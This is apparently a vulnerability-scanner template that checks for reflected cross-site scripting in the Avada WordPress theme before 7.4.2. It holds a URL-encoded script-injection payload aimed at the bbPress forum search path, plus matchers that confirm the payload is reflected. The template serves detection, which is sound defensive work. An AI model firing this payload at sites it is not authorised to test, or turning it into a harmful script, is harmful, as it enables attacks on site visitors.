id: avada-xss
info:
  author: Akincibor
  description: The theme does not properly escape bbPress searches before outputting
    them back as breadcrumbs, leading to a Reflected Cross-Site Scripting issue.
  name: Avada < 7.4.2 - Reflected Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/eb172b07-56ab-41ce-92a1-be38bab567cb
  - https://theme-fusion.com/documentation/avada/installation-maintenance/avada-changelog/
  severity: medium
  tags: xss,wp,wordpress,wp-theme,avada
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"></script><script>alert(document.domain)</script>'
    - avada-footer-scripts
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/'
